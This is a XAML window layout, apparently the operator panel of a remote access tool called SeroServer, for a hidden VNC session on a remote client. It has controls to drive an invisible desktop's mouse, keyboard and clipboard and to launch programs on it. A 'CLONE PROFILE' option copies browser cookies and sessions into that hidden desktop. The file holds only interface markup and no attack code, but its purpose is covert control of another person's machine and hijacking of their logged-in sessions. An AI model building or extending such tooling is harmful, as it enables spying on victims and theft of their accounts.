<dx:ThemedWindow x:Class="SeroServer.UI.HvncWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:dx="http://schemas.devexpress.com/winfx/2008/xaml/core"
        Title="HVNC"
        Width="960" Height="600" MinWidth="520" MinHeight="380"
        ResizeMode="CanResize"
        ShowGlow="False">


    <DockPanel LastChildFill="True">

        <!-- Title bar -->
        <Border DockPanel.Dock="Top" Height="42" Background="{DynamicResource TitleBgBrush}"
                BorderBrush="{DynamicResource TitleBorderBrush}" BorderThickness="0,0,0,1">
            <Grid Margin="14,0">
                <!-- Left: client ID + LIVE badge -->
                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                    <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Security_VisibilityOff.svg'}" Width="14" Height="14" Margin="0,0,7,0" VerticalAlignment="Center"/>
                    <TextBlock x:Name="TxtClientId" Text="" FontSize="11" FontFamily="Consolas" Foreground="{DynamicResource TitleTextBrush}" VerticalAlignment="Center"/>
                    <!-- LIVE badge -->
                    <Border x:Name="LiveBadge" Margin="12,0,0,0" CornerRadius="3"
                            Background="{DynamicResource SectionBgBrush}" BorderBrush="#22C55E" BorderThickness="1"
                            Padding="6,2" Visibility="Collapsed" VerticalAlignment="Center">
                        <StackPanel Orientation="Horizontal">
                            <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
                                <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="4" ShadowDepth="0" Opacity="0.9"/></Ellipse.Effect>
                            </Ellipse>
                            <TextBlock Text="LIVE" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Segoe UI Variable Text, Segoe UI"/>
                        </StackPanel>
                    </Border>
                </StackPanel>
                <!-- Right: FPS + window controls -->
                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                    <Border Margin="0,0,12,0" Padding="8,3" CornerRadius="3" Background="{DynamicResource SidebarCtrlBgBrush}" BorderBrush="{DynamicResource SectionBorderBrush}" BorderThickness="1">
                        <TextBlock x:Name="TxtFps" Text="0 fps" Foreground="{DynamicResource FieldLabelBrush}"
                                   FontSize="10" FontFamily="Segoe UI Mono" MinWidth="44" TextAlignment="Center"/>
                    </Border>
                    <Button x:Name="BtnMenu" Height="26" Padding="8,0" Margin="0,0,4,0"
                            Style="{StaticResource SBtn}" FontSize="11"
                            ToolTip="Actions" Click="BtnMenu_Click">
                        <StackPanel Orientation="Horizontal">
                            <TextBlock Text="&#xE700;" FontFamily="Segoe MDL2 Assets, Segoe Fluent Icons" FontSize="12" Margin="0,0,5,0" VerticalAlignment="Center"/>
                            <TextBlock x:Name="TxtBtnActions" Text="Actions" VerticalAlignment="Center"/>
                        </StackPanel>
                    </Button>
                </StackPanel>
            </Grid>
        </Border>

        <!-- Toolbar — two rows so all controls are always visible regardless of window width -->
        <Border DockPanel.Dock="Top" Background="{DynamicResource TitleBgBrush}"
                BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="0,1,0,1">
            <StackPanel Orientation="Vertical">

                <!-- Row 1: Checkboxes + sliders + START/STOP -->
                <Grid Margin="12,7,12,5">
                    <Grid.ColumnDefinitions>
                        <ColumnDefinition Width="*"/>
                        <ColumnDefinition Width="Auto"/>
                        <ColumnDefinition Width="Auto"/>
                    </Grid.ColumnDefinitions>

                    <!-- Checkboxes -->
                    <StackPanel Grid.Column="0" Orientation="Horizontal" VerticalAlignment="Center">
                        <CheckBox x:Name="ChkMouse" Content="MOUSE" IsChecked="True"
                                  Style="{StaticResource TbarChk}" Margin="0,0,10,0"
                                  ToolTip="Mouse input"/>
                        <CheckBox x:Name="ChkKeyboard" Content="KEYBOARD" IsChecked="True"
                                  Style="{StaticResource TbarChk}" Margin="0,0,10,0"
                                  ToolTip="Keyboard input"/>
                        <CheckBox x:Name="ChkClipboard" Content="CLIPBOARD" IsChecked="False"
                                  Style="{StaticResource TbarChk}" Margin="0,0,10,0"
                                  ToolTip="Clipboard sync — when active, auto-pushes server clipboard to remote desktop"
                                  Checked="ChkClipboard_Checked" Unchecked="ChkClipboard_Unchecked"/>
                        <CheckBox x:Name="ChkCloneProfile" Content="CLONE PROFILE" IsChecked="True"
                                  Style="{StaticResource TbarChk}"
                                  ToolTip="Clone browser profile before launch — copies cookies/sessions into the HVNC desktop"/>
                    </StackPanel>

                    <!-- Quality + FPS sliders -->
                    <StackPanel Grid.Column="1" Orientation="Horizontal" VerticalAlignment="Center" Margin="0,0,10,0">
                        <Rectangle Width="1" Height="16" Margin="0,0,12,0" Fill="{DynamicResource SectionBorderBrush}"/>
                        <TextBlock Text="QUALITY" Foreground="{DynamicResource TitleTextBrush}" FontSize="9" FontWeight="SemiBold"
                                   FontFamily="Segoe UI Variable Text, Segoe UI" VerticalAlignment="Center" Margin="0,0,8,0"/>
                        <Slider x:Name="SldQuality" Minimum="20" Maximum="95" Value="75" Width="72"
                                Style="{StaticResource SlimSlider}"/>
                        <Border Margin="6,0,0,0" Padding="5,1" CornerRadius="3" Background="{DynamicResource SidebarCtrlBgBrush}" BorderBrush="{DynamicResource SectionBorderBrush}" BorderThickness="1">
                            <TextBlock x:Name="TxtQuality" Text="75" Foreground="{DynamicResource LabelBrush}"
                                       FontSize="10" FontFamily="Segoe UI Mono" Width="18" TextAlignment="Center"/>
                        </Border>
                        <Rectangle Width="1" Height="16" Margin="12,0" Fill="{DynamicResource SectionBorderBrush}"/>
                        <TextBlock Text="FPS" Foreground="{DynamicResource TitleTextBrush}" FontSize="9" FontWeight="SemiBold"
                                   FontFamily="Segoe UI Variable Text, Segoe UI" VerticalAlignment="Center" Margin="0,0,8,0"/>
                        <Slider x:Name="SldFps" Minimum="5" Maximum="30" Value="20" Width="58"
                                Style="{StaticResource SlimSlider}"/>
                        <Border Margin="6,0,0,0" Padding="5,1" CornerRadius="3" Background="{DynamicResource SidebarCtrlBgBrush}" BorderBrush="{DynamicResource SectionBorderBrush}" BorderThickness="1">
                            <TextBlock x:Name="TxtFpsVal" Text="20" Foreground="{DynamicResource LabelBrush}"
                                       FontSize="10" FontFamily="Segoe UI Mono" Width="18" TextAlignment="Center"/>
                        </Border>
                    </StackPanel>

                    <!-- START / STOP -->
                    <StackPanel Grid.Column="2" Orientation="Horizontal" VerticalAlignment="Center">
                        <Button x:Name="BtnStart" Content="START" Width="76" Height="26"
                                Style="{StaticResource SGreenBtn}" Click="BtnStart_Click"
                                FontSize="10" FontWeight="Bold" FontFamily="Segoe UI Variable Text, Segoe UI" Padding="14,3"/>
                        <Button x:Name="BtnStop" Content="STOP" Width="70" Height="26" Margin="5,0,0,0"
                                Style="{StaticResource SRedBtn}" Click="BtnStop_Click"
                                IsEnabled="False" Opacity="0.35"
                                FontSize="10" FontWeight="Bold" FontFamily="Segoe UI Variable Text, Segoe UI" Padding="14,3"/>
                    </StackPanel>
                </Grid>

                <!-- Row 2: App launcher -->
                <Grid Margin="12,0,12,7">
                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                        <TextBlock Text="APP" Foreground="{DynamicResource TitleTextBrush}" FontSize="9" FontWeight="SemiBold"
                                   FontFamily="Segoe UI Variable Text, Segoe UI" VerticalAlignment="Center" Margin="0,0,8,0"/>
                        <ComboBox x:Name="CmbApp" Width="140" Height="26" Margin="0,0,6,0"
                                  Style="{StaticResource SCombo}"/>
                        <Button x:Name="BtnLaunch" Content="LAUNCH" Height="26" Padding="12,0"
                                Style="{StaticResource IconBtn}" FontSize="10" FontWeight="SemiBold"
                                Click="BtnLaunch_Click"/>
                        <Button x:Name="BtnCustomPath" Height="26" Width="28" Margin="4,0,0,0"
                                Style="{StaticResource IconBtn}" Padding="0"
                                ToolTip="Browse custom executable"
                                Click="BtnCustomPath_Click">
                            <dx:DXImage Source="{dx:DXImageExtension 'SvgImages/Icon Builder/Actions_FolderOpen.svg'}" Width="14" Height="14"/>
                        </Button>
                    </StackPanel>
                </Grid>

            </StackPanel>
        </Border>

        <!-- Status bar -->
        <Border DockPanel.Dock="Bottom" Height="28" Background="{DynamicResource TitleBgBrush}"
                BorderBrush="{DynamicResource InputBorderBrush}" BorderThickness="0,1,0,0">
            <Grid Margin="14,0">
                <!-- Left: status text -->
                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                    <Ellipse x:Name="StatusDot" Width="6" Height="6" Fill="{DynamicResource InputBorderBrush}"
                             VerticalAlignment="Center" Margin="0,0,7,0"/>
                    <TextBlock x:Name="TxtStatus" Text="Stopped"
                               Foreground="{DynamicResource TitleTextBrush}" FontSize="10" FontFamily="Segoe UI Variable Text, Segoe UI"
                               VerticalAlignment="Center"/>
                </StackPanel>
                <!-- Right: resolution -->
                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                    <TextBlock x:Name="TxtResolution" Text=""
                               Foreground="{DynamicResource LabelBrush}" FontSize="9" FontFamily="Segoe UI Mono"
                               VerticalAlignment="Center" Margin="0,0,10,0"/>
                </StackPanel>
            </Grid>
        </Border>

        <!-- Video canvas -->
        <Grid>
            <Rectangle Fill="#020306"/>
            <Image x:Name="ImgFrame"
                   Stretch="Fill" HorizontalAlignment="Stretch" VerticalAlignment="Stretch"
                   Cursor="Arrow"
                   MouseMove="ImgFrame_MouseMove" MouseDown="ImgFrame_MouseDown"
                   MouseUp="ImgFrame_MouseUp" MouseWheel="ImgFrame_MouseWheel"
                   KeyDown="ImgFrame_KeyDown" KeyUp="ImgFrame_KeyUp" Focusable="True"/>
            <StackPanel x:Name="TxtPlaceholder" HorizontalAlignment="Center" VerticalAlignment="Center" IsHitTestVisible="False">
                <TextBlock Text="Hidden desktop not started"
                           Foreground="{DynamicResource ContentTextBrush}" FontSize="14" FontWeight="SemiBold"
                           FontFamily="Segoe UI Variable Text, Segoe UI" HorizontalAlignment="Center"/>
                <TextBlock Text="Click START to open a hidden virtual desktop"
                           Foreground="{DynamicResource TitleTextBrush}" FontSize="11" FontFamily="Segoe UI Variable Text, Segoe UI"
                           HorizontalAlignment="Center" Margin="0,4,0,0" Opacity="0.7"/>
            </StackPanel>

            <!-- Profile clone progress overlay -->
            <Grid x:Name="ProfileProgressOverlay" Visibility="Collapsed"
                  Background="#B2000000" IsHitTestVisible="False">
                <Border HorizontalAlignment="Center" VerticalAlignment="Center"
                        Background="{DynamicResource SectionBgBrush}" BorderBrush="{DynamicResource SectionBorderBrush}" BorderThickness="1"
                        CornerRadius="8" Padding="32,22" MinWidth="260">
                    <StackPanel>
                        <TextBlock x:Name="ProfileProgressLabel"
                                   Text="Cloning profile..."
                                   Foreground="{DynamicResource LabelBrush}" FontSize="11" FontFamily="Segoe UI Variable Text, Segoe UI"
                                   FontWeight="SemiBold" HorizontalAlignment="Center"
                                   Margin="0,0,0,12"/>
                        <ProgressBar x:Name="ProfileProgressBar"
                                     Minimum="0" Maximum="100" Value="0"
                                     Height="6" Width="200"
                                     Background="{DynamicResource SectionBorderBrush}" BorderThickness="0"
                                     Foreground="{DynamicResource AccentBrush}"/>
                        <TextBlock x:Name="ProfileProgressPct"
                                   Text="0%"
                                   Foreground="{DynamicResource FieldLabelBrush}" FontSize="10" FontFamily="Segoe UI Mono"
                                   HorizontalAlignment="Center" Margin="0,8,0,0"/>
                    </StackPanel>
                </Border>
            </Grid>

            <!-- Reconnecting overlay -->
            <Grid x:Name="ReconnectOverlay" Visibility="Collapsed" IsHitTestVisible="False">
                <Rectangle Fill="#CC000000"/>
                <StackPanel HorizontalAlignment="Center" VerticalAlignment="Center">
                    <TextBlock x:Name="TxtReconnectIcon" Text="⟳" FontSize="36" Foreground="#60A5FA"
                               HorizontalAlignment="Center" Margin="0,0,0,12">
                        <TextBlock.Triggers>
                            <EventTrigger RoutedEvent="Loaded">
                                <BeginStoryboard>
                                    <Storyboard>
                                        <DoubleAnimation Storyboard.TargetProperty="Opacity"
                                                         From="0.3" To="1.0" Duration="0:0:0.8"
                                                         AutoReverse="True" RepeatBehavior="Forever"/>
                                    </Storyboard>
                                </BeginStoryboard>
                            </EventTrigger>
                        </TextBlock.Triggers>
                    </TextBlock>
                    <TextBlock Text="Connection lost" Foreground="{DynamicResource ContentTextBrush}" FontSize="16"
                               FontWeight="SemiBold" FontFamily="Segoe UI Variable Text, Segoe UI" HorizontalAlignment="Center"/>
                    <TextBlock x:Name="TxtReconnectCountdown" Text="Reconnecting... (60s)"
                               Foreground="#94A3B8" FontSize="12" FontFamily="Segoe UI Variable Text, Segoe UI"
                               HorizontalAlignment="Center" Margin="0,6,0,0"/>
                </StackPanel>
            </Grid>
        </Grid>

    </DockPanel>
</dx:ThemedWindow>
